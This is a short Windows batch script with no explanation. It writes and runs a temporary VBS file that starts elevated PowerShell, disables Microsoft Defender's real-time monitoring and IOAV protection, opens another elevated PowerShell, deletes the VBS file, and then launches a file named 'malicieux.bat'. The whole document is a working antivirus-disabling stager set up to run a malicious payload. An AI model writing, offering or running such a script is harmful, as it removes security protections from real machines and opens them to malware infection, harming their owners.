@echo off
echo Set objShell = CreateObject("Shell.Application") > "%temp%\runpsadmin.vbs"
echo objShell.ShellExecute "powershell", "-NoProfile -NoExit -Command ""Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true""", "", "runas" >> "%temp%\runpsadmin.vbs"
echo objShell.ShellExecute "powershell", "-NoProfile -NoExit -Command ""Start-Process powershell -Verb RunAs""", "", "runas" >> "%temp%\runpsadmin.vbs"
"%temp%\runpsadmin.vbs"
del "%temp%\runpsadmin.vbs"
pause



start malicieux.bat